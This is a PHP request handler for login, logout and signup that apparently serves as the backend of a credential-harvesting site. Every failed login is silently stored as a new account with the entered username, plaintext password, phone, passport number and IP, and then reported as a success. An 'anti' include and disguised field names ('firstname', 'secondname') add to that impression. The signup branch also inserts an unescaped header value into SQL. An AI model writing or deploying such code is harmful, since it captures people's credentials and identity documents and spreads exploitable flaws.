<?php

include 'inc/config.php';
include 'inc/functions.php';
include 'inc/anti.php';

$q = $_GET['q'];

if ($q == 'login') {
  antiflood();
  $login = escape('firstname');
  $password = escape('secondname');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $device = $mobile == true ? 'mobile' : 'pc';
  $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER["REMOTE_ADDR"]);
  $user = $db->query("SELECT id from users where login='$login' and password='$password'")->fetch_assoc();
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('error');
  }elseif(!empty($phone) && strlen($phone) < 10 || strlen($phone) > 14){
    die('error_phone');
  }elseif (isset($user['id'])) {
    $_SESSION['user_id'] = $user['id'];
    die('success');
  }else{
    $db -> query("INSERT into users set
      login='$login',
      password='$password',
      phone='$phone',
      passport='$passport',
      device='$device',
      ip='$ip'");
    $_SESSION['user_id'] = $db->insert_id;
    die("success");
  }
}elseif($q == 'logout'){
  unset($_SESSION['user_id']);
}elseif($q == 'signup' && !isset($us['id'])){
  $login = escape('login');
  $password = escape('password');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $device = $mobile == true ? 'mobile' : 'pc';
  $type = intval(1);
  $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('error');
  }else{
    $db -> query("INSERT into users set
      login = '$login',
      password = '$password',
      phone = '$phone',
      passport = '$passport',
      device = '$device',
      type = '$type',
      ip = '$ip'");
    $_SESSION['user_id'] = $db->insert_id;
    die('success');
  }
}
